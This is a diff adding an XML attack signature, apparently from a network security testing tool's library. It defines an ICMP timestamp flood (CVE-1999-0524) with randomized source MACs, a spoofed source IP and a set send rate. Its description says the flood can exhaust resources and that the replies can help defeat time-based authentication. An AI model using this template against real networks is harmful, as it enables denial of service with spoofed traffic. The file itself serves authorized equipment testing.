@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ICMP Timestamp Flood"/>
+    <EngDesc display="true" value="This threat is executed by sending a remote host requests for an ICMP timestamp from randomized, false sources. This causes the targeted system to reply to all messages resulting in resource exhaustion and possibly a denial of service. Also, this threat can be modified to examine the ICMP timestamp reply in order to determine the date on the targeted system. This information can be useful when trying to defeat time based authentication tools. "/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Scoping"/>
+      <item value="Resource_Exhaustion"/>
+      <item value="Standards_Exploitation"/>
+      <item value="Flood"/>
+    </Intent>
+    <Protocol display="true" value="ICMP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="ALL"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Transport_Layer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Transport_Layer_ICMP"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://cgi.nessus.org/plugins/dump.php3?id=10114"/>
+    <CVEID display="true" value="CVE-1999-0524"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="94"/>
+    <Author display="true" value="Phil Trainor"/>
+    <ID display="true" value="000000ff464e48f600a900fe009b00c92b2dc8db"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632726584000937500"/>
+    <SigStyle display="false" value="Flood"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="ICMP"/>
+    <Rate display="false" value="5"/>
+    <Regex display="false" value=""/>
+    <Created value="1139461747" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="spoofedGatewayAddress" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="payload" type="ImperfectControls.Payload" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="@random(00:00:00:00:00:00,FF:FF:FF:FF:FF:FF)" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="30" Protocol="1" HeaderChecksum="" srcIP="$spoofedGatewayAddress" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <ICMP Type="d" Code="0" Checksum="" Identifier="" SequenceNumber="" Pointer="" unused3Byte="" Unused4Byte="" GatewayInternetAddress="@random(0,FFFFFFFF)" Payload="$payload"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
